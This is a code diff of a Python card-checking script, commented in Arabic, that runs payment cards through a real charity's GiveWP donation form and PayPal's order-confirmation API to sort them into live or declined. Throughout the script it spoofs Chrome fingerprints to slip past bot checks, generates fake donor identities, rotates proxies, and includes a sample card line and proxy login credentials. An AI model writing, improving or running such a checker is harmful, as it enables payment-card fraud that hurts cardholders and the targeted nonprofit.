@@ -1,12 +1,12 @@
-import asyncio
 import re
 import json
 import base64
 import secrets
+import uuid
+import asyncio
 from faker import Faker
 from curl_cffi.requests import AsyncSession
 from proxy_manager import get_next_proxy
-from requests_toolbelt.multipart.encoder import MultipartEncoder
 
 fake = Faker("en_US")
 
@@ -18,10 +18,21 @@ class tools:
         mm = parts[1].strip() if len(parts) > 1 else ""
         yy = parts[2].strip() if len(parts) > 2 else ""
         cvv = parts[3].strip() if len(parts) > 3 else ""
+        
         mm = mm.zfill(2)
         if len(yy) == 4:
             yy = yy[-2:]
+        elif len(yy) == 2:
+            yy = yy
+            
         return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+
+    @staticmethod
+    def find_between(s: str, first: str, last: str) -> str | None:
+        try:
+            return s.split(first, 1)[1].split(last, 1)[0]
+        except (IndexError, AttributeError):
+            return None
 
     @staticmethod
     def userdata() -> dict:
@@ -75,78 +86,66 @@ class Gateway:
     @staticmethod
     async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
         token = secrets.token_hex(16)
-        async with AsyncSession(impersonate="chrome124", proxies=proxies) as session:
+
+        # استخدام جلسة غير متزامنة مع تفعيل محاكاة متصفح كروم المتوافقة
+        async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
             try:
-                # ------------------- Step 1: GET with full headers -------------------
-                print("\n[🌐 Step 1] Requesting Donation Page...")
-                headers_get = {
-                    'authority': 'bukjeh.org',
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'cache-control': 'max-age=0',
-                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'document',
-                    'sec-fetch-mode': 'navigate',
-                    'sec-fetch-site': 'none',
-                    'sec-fetch-user': '?1',
-                    'upgrade-insecure-requests': '1',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+                # 1. طلب الصفحة الرئيسية (GET) مع الهيدرز الكاملة لتخطي فحص البصمة
+                headers_init = {
+                    "authority": "bukjeh.org",
+                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "accept-language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "cache-control": "max-age=0",
+                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                    "sec-ch-ua-mobile": "?1",
+                    "sec-ch-ua-platform": '"Android"',
+                    "sec-fetch-dest": "document",
+                    "sec-fetch-mode": "navigate",
+                    "sec-fetch-site": "none",
+                    "sec-fetch-user": "?1",
+                    "upgrade-insecure-requests": "1",
+                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                 }
-                resp_init = await session.get("https://bukjeh.org/donations/donation-2023-2-3/", headers=headers_get)
-                print(f"   ├─ Status Code: {resp_init.status_code}")
+                resp_init = await session.get(
+                    "https://bukjeh.org/donations/donation-2023-2-3/",
+                    headers=headers_init,
+                )
                 html = resp_init.text
-
-                if "give-form-hash" not in html:
-                    print("   ⚠️ Form fields not found, waiting 6s and retrying...")
-                    await asyncio.sleep(6)
-                    resp_init = await session.get("https://bukjeh.org/donations/donation-2023-2-3/", headers=headers_get)
-                    html = resp_init.text
-
-                try:
-                    hash_val = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
-                    pre = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
-                    give = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
-                except AttributeError:
-                    print("   ❌ Could not find form fields in HTML.")
-                    print(f"   └─ HTML Preview (first 500 chars): {html[:500]}")
+                
+                # استخراج القيم البرمجية الأساسية للنموذج
+                hash_val = tools.find_between(html, 'name="give-form-hash" value="', '"')
+                pre = tools.find_between(html, 'name="give-form-id-prefix" value="', '"')
+                give = tools.find_between(html, 'name="give-form-id" value="', '"')
+                
+                if not hash_val or not pre or not give:
                     return "Error", "Missing form parameters", False
 
                 enc_match = re.search(r'"data-client-token":"(.*?)"', html)
                 if not enc_match:
-                    print("   ❌ data-client-token not found.")
                     return "Error", "data-client-token not found", False
                 enc = enc_match.group(1)
                 dec = base64.b64decode(enc).decode("utf-8")
                 au_match = re.search(r'"accessToken":"(.*?)"', dec)
                 if not au_match:
-                    print("   ❌ accessToken not found.")
                     return "Error", "accessToken not found", False
                 au = au_match.group(1)
 
-                print(f"   ├─ Hash: {hash_val}")
-                print(f"   ├─ Prefix: {pre}")
-                print(f"   └─ Give ID: {give}")
-                print(f"   └─ AccessToken: {au[:15]}...")
-
-                # ------------------- Step 2: AJAX (no files) -------------------
-                print("\n[⚡ Step 2] Sending give_process_donation...")
+                # 2. الخطوة الأولى لـ AJAX (give_process_donation) باستخدام بيانات form-urlencoded
                 headers_ajax1 = {
-                    'authority': 'bukjeh.org',
-                    'accept': '*/*',
-                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'origin': 'https://bukjeh.org',
-                    'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
-                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-                    'x-requested-with': 'XMLHttpRequest',
+                    "authority": "bukjeh.org",
+                    "accept": "*/*",
+                    "accept-language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "origin": "https://bukjeh.org",
+                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                    "sec-ch-ua-mobile": "?1",
+                    "sec-ch-ua-platform": '"Android"',
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-origin",
+                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+                    "x-requested-with": "XMLHttpRequest",
                 }
                 data_ajax1 = {
                     "give-fee-amount": "0",
@@ -155,7 +154,7 @@ class Gateway:
                     "give-honeypot": "",
                     "give-form-id-prefix": pre,
                     "give-form-id": give,
-                    "give-form-title": "Help us make A’amar",
+                    "give-form-title": "Help us make A'amar",
                     "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                     "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                     "give-form-minimum": "1.00",
@@ -180,105 +179,89 @@ class Gateway:
                     "action": "give_process_donation",
                     "give_ajax": "true",
                 }
-                resp_ajax1 = await session.post(
+                await session.post(
                     "https://bukjeh.org/wp-admin/admin-ajax.php",
                     headers=headers_ajax1,
                     data=data_ajax1,
                 )
-                print(f"   ├─ Status Code: {resp_ajax1.status_code}")
-                print(f"   └─ Response: {resp_ajax1.text[:200]}")
 
-                # ------------------- Step 3: create_order (multipart) -------------------
-                print("\n[⚡ Step 3] Creating PayPal Order (create_order)...")
+                # 3. إنشاء طلب PayPal (give_paypal_commerce_create_order) باستخدام صيغة files لتوافقية الـ multipart
                 headers_ajax2 = {
-                    'authority': 'bukjeh.org',
-                    'accept': '*/*',
-                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'origin': 'https://bukjeh.org',
-                    'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
-                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+                    "authority": "bukjeh.org",
+                    "accept": "*/*",
+                    "accept-language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "origin": "https://bukjeh.org",
+                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
+                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                    "sec-ch-ua-mobile": "?1",
+                    "sec-ch-ua-platform": '"Android"',
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-origin",
+                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                 }
-                params_ajax2 = {"action": "give_paypal_commerce_create_order"}
-
+                params_ajax2 = {
+                    "action": "give_paypal_commerce_create_order",
+                }
                 files_ajax2 = {
-                    "give-fee-amount": (None, "0"),
-                    "give-fee-mode-enable": (None, "false"),
-                    "give-fee-status": (None, "enabled"),
-                    "give-honeypot": (None, ""),
-                    "give-form-id-prefix": (None, pre),
-                    "give-form-id": (None, give),
-                    "give-form-title": (None, "Help us make A’amar"),
-                    "give-current-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
-                    "give-form-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
-                    "give-form-minimum": (None, "1.00"),
-                    "give-form-maximum": (None, "999999.99"),
-                    "give-form-hash": (None, hash_val),
-                    "give-price-id": (None, "3"),
-                    "give-recurring-logged-in-only": (None, ""),
-                    "give-logged-in-only": (None, "1"),
-                    "_give_is_donation_recurring": (None, "0"),
-                    "give_recurring_donation_details": (None, '{"give_recurring_option":"yes_donor"}'),
-                    "give-amount": (None, "1.00"),
-                    "give-recurring-period-donors-choice": (None, "month"),
-                    "give_stripe_payment_method": (None, ""),
-                    "payment-mode": (None, "paypal-commerce"),
-                    "give_first": (None, user_data["first"]),
-                    "give_last": (None, user_data["last"]),
-                    "give_email": (None, user_data["email"]),
-                    "card_name": (None, user_data["name"]),
-                    "card_exp_month": (None, ""),
-                    "card_exp_year": (None, ""),
-                    "give-gateway": (None, "paypal-commerce"),
+                    'give-fee-amount': (None, '0'),
+                    'give-fee-mode-enable': (None, 'false'),
+                    'give-fee-status': (None, 'enabled'),
+                    'give-honeypot': (None, ''),
+                    'give-form-id-prefix': (None, pre),
+                    'give-form-id': (None, give),
+                    'give-form-title': (None, "Help us make A'amar"),
+                    'give-current-url': (None, 'https://bukjeh.org/donations/donation-2023-2-3/'),
+                    'give-form-url': (None, 'https://bukjeh.org/donations/donation-2023-2-3/'),
+                    'give-form-minimum': (None, '1.00'),
+                    'give-form-maximum': (None, '999999.99'),
+                    'give-form-hash': (None, hash_val),
+                    'give-price-id': (None, '3'),
+                    'give-recurring-logged-in-only': (None, ''),
+                    'give-logged-in-only': (None, '1'),
+                    '_give_is_donation_recurring': (None, '0'),
+                    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
+                    'give-amount': (None, '1.00'),
+                    'give-recurring-period-donors-choice': (None, 'month'),
+                    'give_stripe_payment_method': (None, ''),
+                    'payment-mode': (None, 'paypal-commerce'),
+                    'give_first': (None, user_data["first"]),
+                    'give_last': (None, user_data["last"]),
+                    'give_email': (None, user_data["email"]),
+                    'card_name': (None, user_data["name"]),
+                    'card_exp_month': (None, ''),
+                    'card_exp_year': (None, ''),
+                    'give-gateway': (None, 'paypal-commerce'),
                 }
-
-                encoder_ajax2 = MultipartEncoder(fields=files_ajax2)
-                headers_ajax2['Content-Type'] = encoder_ajax2.content_type
-
                 resp_ajax2 = await session.post(
                     "https://bukjeh.org/wp-admin/admin-ajax.php",
                     params=params_ajax2,
                     headers=headers_ajax2,
-                    data=encoder_ajax2,
+                    files=files_ajax2,
                 )
-                print(f"   ├─ Status Code: {resp_ajax2.status_code}")
-                print(f"   └─ Response Text: {resp_ajax2.text}")
-
-                try:
-                    ajax2_json = resp_ajax2.json()
-                    order_id = ajax2_json.get("data", {}).get("id")
-                except Exception:
-                    order_id = None
-
+                ajax2_json = resp_ajax2.json()
+                order_id = ajax2_json.get("data", {}).get("id")
                 if not order_id:
-                    print("   ❌ [Error in Step 3] Failed to get order_id.")
                     return "Error", "Failed to create PayPal order", False
-                print(f"   └─ Order ID Created: {order_id}")
 
-                # ------------------- Step 4: Confirm payment via PayPal -------------------
-                print("\n[💳 Step 4] Confirming Payment with PayPal API...")
+                # 4. تأكيد بيانات البطاقة عبر بوابة PayPal مباشرة باستخدام JSON
                 headers_paypal = {
-                    'authority': 'cors.api.paypal.com',
-                    'accept': '*/*',
-                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'authorization': f'Bearer {au}',
-                    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
-                    'content-type': 'application/json',
-                    'origin': 'https://assets.braintreegateway.com',
-                    'paypal-client-metadata-id': token,
-                    'referer': 'https://assets.braintreegateway.com/',
-                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'cross-site',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+                    "authority": "cors.api.paypal.com",
+                    "accept": "*/*",
+                    "accept-language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "authorization": f"Bearer {au}",
+                    "braintree-sdk-version": "3.32.0-payments-sdk-dev",
+                    "content-type": "application/json",
+                    "origin": "https://assets.braintreegateway.com",
+                    "paypal-client-metadata-id": token,
+                    "referer": "https://assets.braintreegateway.com/",
+                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                    "sec-ch-ua-mobile": "?1",
+                    "sec-ch-ua-platform": '"Android"',
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "cross-site",
+                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                 }
                 json_paypal = {
                     "payment_source": {
@@ -286,58 +269,42 @@ class Gateway:
                             "number": card_data["cc"],
                             "expiry": f"20{card_data['yy']}-{card_data['mm']}",
                             "security_code": card_data["cvv"],
-                            "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}},
+                            "attributes": {
+                                "verification": {
+                                    "method": "SCA_WHEN_REQUIRED",
+                                },
+                            },
                         },
                     },
-                    "application_context": {"vault": False},
+                    "application_context": {
+                        "vault": False,
+                    },
                 }
                 resp_paypal = await session.post(
                     f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                     headers=headers_paypal,
                     json=json_paypal,
                 )
-                print(f"   ├─ Status Code: {resp_paypal.status_code}")
-                print(f"   └─ Response: {resp_paypal.text[:250]}")
                 paypal_text = resp_paypal.text.lower()
 
-                # ------------------- Step 5: approve_order (multipart) -------------------
-                print("\n[⚡ Step 5] Approving Order (approve_order)...")
-                headers_ajax3 = {
-                    'authority': 'bukjeh.org',
-                    'accept': '*/*',
-                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'origin': 'https://bukjeh.org',
-                    'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
-                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-                }
+                # 5. الموافقة النهائية على الطلب (give_paypal_commerce_approve_order)
+                headers_ajax3 = headers_ajax2.copy()
                 params_ajax3 = {
                     "action": "give_paypal_commerce_approve_order",
                     "order": order_id,
                 }
-
-                # نفس محتويات files_ajax2
-                files_ajax3 = files_ajax2
-                encoder_ajax3 = MultipartEncoder(fields=files_ajax3)
-                headers_ajax3['Content-Type'] = encoder_ajax3.content_type
-
+                files_ajax3 = files_ajax2.copy()
                 resp_ajax3 = await session.post(
                     "https://bukjeh.org/wp-admin/admin-ajax.php",
                     params=params_ajax3,
                     headers=headers_ajax3,
-                    data=encoder_ajax3,
+                    files=files_ajax3,
                 )
-                print(f"   ├─ Status Code: {resp_ajax3.status_code}")
-                print(f"   └─ Response: {resp_ajax3.text}")
-
                 approve_text = resp_ajax3.text.lower()
+
                 combined = paypal_text + " " + approve_text
 
+                # مطابقة الاستجابة مع القاموس المعرف مسبقاً
                 for key, (status, msg, is_live) in RESPONSE_MAP.items():
                     if key in combined:
                         return status, msg, is_live
@@ -345,17 +312,17 @@ class Gateway:
                 try:
                     error_data = resp_ajax3.json()
                     if 'data' in error_data and 'error' in error_data['data']:
-                        return "Declined", f"{error_data['data']['error']} ❌", False
-                except Exception:
+                        err_msg = error_data['data']['error']
+                        return "Declined", f"{err_msg} ❌", False
+                except:
                     pass
 
                 return "Unknown", "Unrecognised response ❓", False
 
             except Exception as e:
-                print(f"\n❌ [Exception Captured]: {str(e)}")
                 return "Error", f"Exception: {str(e)}", False
 
-# ------------------- دوال التشغيل -------------------
+
 async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
     card_data = tools.getcard(card_line)
     if not card_data["cc"]:
@@ -363,9 +330,8 @@ async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, 
 
     max_attempts = 5
     for attempt in range(max_attempts):
-        print(f"\n==================== Attempt {attempt + 1}/{max_attempts} ====================")
         user_data = tools.userdata()
-        proxy_url_new = proxy_url if proxy_url else get_next_proxy()
+        proxy_url_new = get_next_proxy()
         proxies = {"http": proxy_url_new, "https": proxy_url_new} if proxy_url_new else None
 
         status, msg, is_live = await Gateway.charge_card(
@@ -382,7 +348,7 @@ async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, 
             return status, msg, is_live
 
     return "Error", "Max attempts exceeded unexpectedly", False
-
+    
 async def main():
     test_card = "4211566115568609|12|28|321"
     proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"
@@ -393,7 +359,7 @@ async def main():
 
     status, message, is_live = await process_paypal_1(test_card, proxy_url=proxy)
 
-    print("\n---------------- FINAL RESULT ----------------")
+    print("\n--- Execution Result ---")
     print(f"Status  : {status}")
     print(f"Message : {message}")
     print(f"Live    : {is_live}")
